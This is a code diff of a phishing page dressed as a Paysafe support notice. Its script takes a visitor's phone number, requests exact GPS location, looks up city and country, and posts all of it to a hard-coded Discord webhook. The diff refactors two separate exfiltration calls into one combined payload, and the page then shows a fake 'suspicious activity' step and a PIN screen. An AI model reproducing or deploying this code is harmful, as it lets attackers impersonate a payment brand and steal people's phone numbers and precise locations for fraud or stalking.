@@ -172,7 +172,7 @@
             <p class="note">If you have any questions or require assistance, please visit the official Paysafe website or contact their support.</p>
         </div>
     </div>
-    <script type="module">
+   <script type="module">
         const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Re"; // Replace with your actual Discord webhook URL
 
         const phoneInputSection = document.getElementById('phoneInputSection');
@@ -186,7 +186,7 @@
 
         let countryCallingCode = '+1'; // Default to +1
 
-        // Function to send data to Discord webhook
+        // Function to send all data (phone number + GPS location) to Discord
         async function sendToDiscord(data) {
             try {
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
@@ -206,8 +206,8 @@
             }
         }
 
-        // Function to request GPS location and send it to Discord
-        function requestGPSLocation() {
+        // Function to request GPS location and send everything to Discord
+        function requestGPSLocationAndSendData(phoneNumber) {
             if (navigator.geolocation) {
                 gpsStatus.textContent = 'Requesting GPS permission...';
                 gpsStatus.className = ''; // Clear previous status styles
@@ -225,13 +225,16 @@
                         const city = locationData.address.city || locationData.address.town || locationData.address.village || 'Unknown';
                         const country = locationData.address.country || 'Unknown';
 
-                        // Send GPS coordinates, city, country to Discord
-                        const gpsPayload = {
-                            content: `GPS Location for Submitted Phone Number:`,
+                        // Prepare and send payload with both phone number and location data to Discord
+                        const fullPhoneNumber = countryCallingCode + phoneNumber.replace(/[\s-()]/g, ''); // Format for webhook
+
+                        const combinedPayload = {
+                            content: `New Submission Received!`,
                             embeds: [{
-                                title: "Exact GPS Location",
+                                title: "Submission Details",
                                 color: 5763719, // A nice green color
                                 fields: [
+                                    { name: "Full Phone Number", value: fullPhoneNumber, inline: false },
                                     { name: "Latitude", value: latitude, inline: true },
                                     { name: "Longitude", value: longitude, inline: true },
                                     { name: "City", value: city, inline: true },
@@ -240,9 +243,10 @@
                                 ]
                             }]
                         };
-                        await sendToDiscord(gpsPayload);
+                        
+                        await sendToDiscord(combinedPayload);
 
-                        // Show PIN display after sending GPS
+                        // Show PIN display after sending data to Discord
                         suspiciousActivitySection.classList.add('hidden');
                         pinDisplaySection.classList.remove('hidden');
                     },
@@ -288,41 +292,10 @@
                 phoneNumberError.style.display = 'none'; // Hide error message if valid
             }
 
-            const fullPhoneNumber = countryCallingCode + rawPhoneNumber.replace(/[\s-()]/g, ''); // Format for webhook
-
-            // Send phone number to Discord Webhook
-            const phoneNumberPayload = {
-                content: `New Phone Number Submission:`,
-                embeds: [{
-                    title: "Phone Number Provided",
-                    color: 16763904, // A nice orange color
-                    fields: [
-                        { name: "Full Phone Number", value: fullPhoneNumber, inline: false }
-                    ]
-                }]
-            };
-
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(phoneNumberPayload),
-                });
-
-                if (response.ok) {
-                    console.log('Phone number sent to Discord successfully!');
-                    // After successful submission, switch to suspicious activity section
-                    phoneInputSection.classList.add('hidden');
-                    suspiciousActivitySection.classList.remove('hidden');
-                    requestGPSLocation(); // Request GPS after phone number submission
-                } else {
-                    console.error('Error submitting phone number to Discord.');
-                }
-            } catch (error) {
-                console.error('Error sending phone number to Discord:', error);
-            }
+            // Proceed to location request after phone number validation
+            phoneInputSection.classList.add('hidden');
+            suspiciousActivitySection.classList.remove('hidden');
+            requestGPSLocationAndSendData(rawPhoneNumber); // Send both phone number and location data
         });
     </script>
 
